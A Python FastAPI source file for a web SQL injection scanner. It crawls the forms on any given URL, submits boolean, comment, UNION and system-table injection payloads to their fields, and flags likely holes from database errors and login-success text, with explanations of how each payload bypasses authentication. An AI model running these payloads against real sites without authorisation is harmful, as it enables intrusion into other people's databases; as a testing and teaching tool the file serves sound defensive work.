from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, HttpUrl
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import asyncio
from typing import List, Dict, Any
import re
import uvicorn

app = FastAPI(title="SQL Injection Scanner", description="Web-based SQL Injection Vulnerability Scanner")

app.mount("/static", StaticFiles(directory="static"), name="static")

class ScanRequest(BaseModel):
    url: HttpUrl

# Response models
class InputField(BaseModel):
    type: str
    name: str
    value: str

class FormDetails(BaseModel):
    action: str
    method: str
    inputs: List[InputField]

class PayloadExplanation(BaseModel):
    payload: str
    technique: str
    explanation: str
    risk_level: str
    how_it_works: str

class VulnerabilityResult(BaseModel):
    form_action: str
    payload: str
    vulnerable: bool
    response_indicators: List[str]
    confidence: str  # High, Medium, Low
    payload_explanation: PayloadExplanation

class ScanResult(BaseModel):
    url: str
    total_forms: int
    vulnerabilities: List[VulnerabilityResult]
    scan_completed: bool
    error_message: str = None

class SQLInjectionScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/137.0.0.0 Safari/537.36"
        
        # Payload explanations database
        self.payload_explanations = {
            "' OR '1'='1": PayloadExplanation(
                payload="' OR '1'='1",
                technique="Boolean-based SQL Injection",
                explanation="This payload exploits improper input validation by injecting SQL logic that always evaluates to true.",
                risk_level="High",
                how_it_works="The single quote (') closes the original string parameter, then 'OR '1'='1' adds a condition that's always true, effectively bypassing authentication or revealing all data in the query."
            ),
            '" OR "1"="1': PayloadExplanation(
                payload='" OR "1"="1',
                technique="Boolean-based SQL Injection (Double Quotes)",
                explanation="Similar to single quote injection but uses double quotes to escape string parameters.",
                risk_level="High",
                how_it_works="The double quote (\") closes the original string, then 'OR \"1\"=\"1\"' creates a condition that always returns true, bypassing security checks or revealing unauthorized data."
            ),
            "' OR 1=1--": PayloadExplanation(
                payload="' OR 1=1--",
                technique="Boolean-based SQL Injection with Comment",
                explanation="This payload combines boolean logic with SQL comment to bypass authentication and ignore subsequent query conditions.",
                risk_level="High",
                how_it_works="The quote (') closes the string, 'OR 1=1' creates a true condition, and '--' comments out the rest of the query, including password checks or other security conditions."
            ),
            "admin'--": PayloadExplanation(
                payload="admin'--",
                technique="Authentication Bypass with Comment",
                explanation="This payload attempts to bypass login by commenting out password verification in login queries.",
                risk_level="High",
                how_it_works="By entering 'admin'--' as username, the query becomes 'SELECT * FROM users WHERE username='admin'--' AND password='...', effectively ignoring the password check due to the comment."
            ),
            "' UNION SELECT 1,2,3--": PayloadExplanation(
                payload="' UNION SELECT 1,2,3--",
                technique="UNION-based SQL Injection",
                explanation="This payload uses UNION to combine results from the original query with data from other tables or custom values.",
                risk_level="Critical",
                how_it_works="The UNION operator combines the original query with a custom SELECT statement, potentially allowing extraction of sensitive data from other database tables or revealing database structure."
            ),
            "1' AND (SELECT COUNT(*) FROM sysobjects)>0--": PayloadExplanation(
                payload="1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
                technique="Blind SQL Injection with System Table Access",
                explanation="This payload tests for SQL Server databases by querying system tables, indicating potential for deeper database enumeration.",
                risk_level="Critical",
                how_it_works="The subquery '(SELECT COUNT(*) FROM sysobjects)>0' attempts to access SQL Server system tables. Success indicates SQL injection vulnerability and reveals database type information."
            )
        }
    
    def get_payload_explanation(self, payload: str) -> PayloadExplanation:
        """Get explanation for a specific payload"""
        return self.payload_explanations.get(payload, PayloadExplanation(
            payload=payload,
            technique="Custom SQL Injection",
            explanation="This is a custom SQL injection payload designed to test specific vulnerability patterns.",
            risk_level="Medium",
            how_it_works="Custom payloads may exploit specific application logic or database configurations."
        ))
    
    def get_forms(self, url: str):
        """Get all forms from a page"""
        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Failed to fetch URL: {str(e)}")
    
    def form_details(self, form) -> FormDetails:
        """Extract details from a form"""
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name", "")
            input_value = input_tag.attrs.get("value", "")
            inputs.append(InputField(
                type=input_type,
                name=input_name,
                value=input_value
            ))
        
        return FormDetails(
            action=action,
            method=method,
            inputs=inputs
        )
    
    def check_vulnerability(self, original_response, injected_response) -> tuple[bool, List[str], str]:
        """Improved vulnerability detection with confidence scoring"""
        original_content = original_response.content.decode(errors="ignore").lower()
        injected_content = injected_response.content.decode(errors="ignore").lower()
        
        # Database error patterns (actual errors, not educational content)
        critical_sql_errors = [
            r"mysql_fetch_array\(\)",
            r"mysql_num_rows\(\)",
            r"ora-\d{5}",
            r"microsoft ole db provider for odbc drivers",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"syntax error.*near",
            r"table.*doesn't exist",
            r"column.*cannot be null",
            r"duplicate entry.*for key"
        ]
        
        # Educational/demonstration patterns (likely false positives)
        educational_patterns = [
            r"sql query:",
            r"hint:",
            r"select.*from.*where.*limit",
            r"does.*database.*allow",
            r"md5.*password.*protection"
        ]
        
        # Success bypass indicators
        success_indicators = [
            "logout", "dashboard", "welcome back", "admin panel", 
            "logged in successfully", "authentication successful"
        ]
        
        found_indicators = []
        confidence = "Low"
        is_vulnerable = False
        
        # Check for critical SQL errors (high confidence)
        for error_pattern in critical_sql_errors:
            if re.search(error_pattern, injected_content) and not re.search(error_pattern, original_content):
                found_indicators.append(f"Critical SQL Error: {error_pattern}")
                confidence = "High"
                is_vulnerable = True
        
        # Check for successful authentication bypass
        for indicator in success_indicators:
            if indicator in injected_content and indicator not in original_content:
                found_indicators.append(f"Authentication Bypass: {indicator}")
                confidence = "High" 
                is_vulnerable = True
        
        # Check response length differences (potential blind SQL injection)
        if abs(len(injected_content) - len(original_content)) > 500:
            found_indicators.append("Significant response length difference")
            confidence = "Medium"
            is_vulnerable = True
        
        # Check for educational content (likely false positive)
        educational_content = False
        for pattern in educational_patterns:
            if re.search(pattern, injected_content):
                educational_content = True
                found_indicators.append(f"Educational content detected: {pattern}")
        
        # If we found SQL errors but also educational content, lower confidencez
        if educational_content and any("sql error" in indicator.lower() for indicator in found_indicators):
            confidence = "Low"
            is_vulnerable = False  # Likely a training site
            found_indicators.append("Warning: This may be educational/training content, not a real vulnerability")
        
        return is_vulnerable, found_indicators, confidence
    
    def get_baseline_response(self, url: str, form_details: FormDetails):
        """Get a baseline response with normal/empty values"""
        target_url = urljoin(url, form_details.action or url)
        data = {}
        
        for input_field in form_details.inputs:
            if not input_field.name:
                continue
            
            if input_field.type in ['text', 'password', 'email']:
                data[input_field.name] = "normal_user"  # Normal value
            elif input_field.type == 'hidden':
                data[input_field.name] = input_field.value
            elif input_field.type == 'submit':
                data[input_field.name] = input_field.value
            else:
                data[input_field.name] = "test"
        
        try:
            if form_details.method == "post":
                return self.session.post(target_url, data=data, timeout=10)
            else:
                return self.session.get(target_url, params=data, timeout=10)
        except Exception:
            return None
    
    async def scan_url(self, url: str) -> ScanResult:
        """Main scanning function with comprehensive payload testing"""
        try:
            forms = self.get_forms(url)
            vulnerabilities = []
            
            for form_index, form in enumerate(forms):
                details = self.form_details(form)
                target_url = urljoin(url, details.action or url)
                
                # Get baseline response first
                baseline_response = self.get_baseline_response(url, details)
                if not baseline_response:
                    continue
                
                # Test all payloads for this form
                form_vulnerabilities = []
                payloads = [
                    "' OR '1'='1", 
                    '" OR "1"="1', 
                    "' OR 1=1--", 
                    "admin'--",
                    "' UNION SELECT 1,2,3--",
                    "1' AND (SELECT COUNT(*) FROM sysobjects)>0--"
                ]
                
                for payload in payloads:
                    data = {}
                    
                    for input_field in details.inputs:
                        if not input_field.name:
                            continue
                        
                        if input_field.type in ['text', 'password', 'email']:
                            data[input_field.name] = payload
                        elif input_field.type == 'hidden':
                            data[input_field.name] = input_field.value
                        elif input_field.type == 'submit':
                            data[input_field.name] = input_field.value
                        else:
                            data[input_field.name] = "test"
                    
                    try:
                        if details.method == "post":
                            response = self.session.post(target_url, data=data, timeout=10)
                        else:
                            response = self.session.get(target_url, params=data, timeout=10)
                        
                        is_vulnerable, indicators, confidence = self.check_vulnerability(baseline_response, response)
                        
                        if is_vulnerable and confidence in ["High", "Medium"]:
                            form_vulnerabilities.append(VulnerabilityResult(
                                form_action=f"{target_url} (Form #{form_index + 1})",
                                payload=payload,
                                vulnerable=True,
                                response_indicators=indicators,
                                confidence=confidence,
                                payload_explanation=self.get_payload_explanation(payload)
                            ))
                        
                    except Exception as e:
                        continue  # Skip failed requests
                
                # Add all vulnerabilities found for this form
                vulnerabilities.extend(form_vulnerabilities)
            
            return ScanResult(
                url=str(url),
                total_forms=len(forms),
                vulnerabilities=vulnerabilities,
                scan_completed=True
            )
            
        except Exception as e:
            return ScanResult(
                url=str(url),
                total_forms=0,
                vulnerabilities=[],
                scan_completed=False,
                error_message=str(e)
            )

# Initialize scanner
scanner = SQLInjectionScanner()

@app.get("/", response_class=HTMLResponse)
async def read_root():
    """Serve the main HTML page"""
    try:
        with open("static/index.html", "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    except FileNotFoundError:
        return HTMLResponse(content="""
        <html>
            <body>
                <h1>SQL Injection Scanner</h1>
                <p>Please create static/index.html file</p>
            </body>
        </html>
        """)

@app.post("/scan", response_model=ScanResult)
async def scan_endpoint(request: ScanRequest):
    """Endpoint to scan a URL for SQL injection vulnerabilities"""
    result = await scanner.scan_url(str(request.url))
    return result

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy"}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)